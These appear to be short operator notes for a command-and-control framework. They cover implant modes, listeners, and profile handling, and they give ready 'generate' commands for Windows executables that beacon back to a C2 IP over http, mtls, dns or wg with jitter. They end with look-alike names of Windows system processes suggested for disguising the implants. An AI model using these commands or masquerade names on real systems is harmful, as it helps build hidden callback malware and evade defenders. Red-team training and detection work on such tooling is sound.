## Implants
* implants are the agents you drop onto hosts
* can operate in beacon or session mode
	* session mode - interactive
	* beacon mode - sends commands on an interval w jitter
		* each command turns into a task (view with `tasks`)
		* use `interactive` to swtich into session mode
* needs a running listener on the c2 server to communicate w/
* `generate --[http/mtls/dns/wg] --os windows --arch amd64 --format exe --save [output dir]`
* `generate beacon --http [ip] --os windows --arch amd64 --format exe --seconds 3 --jitter 2 --save [output dir]`
### Profiles
* can be used to create multiple beacons off the same settings
* `profiles new [beacon]`
* `profiles generate [name] --save [output dir]`
### Windows Binary Name Ideas
* SecurItyHealthService.exe
* dlIhost.exe
* sVchost.exe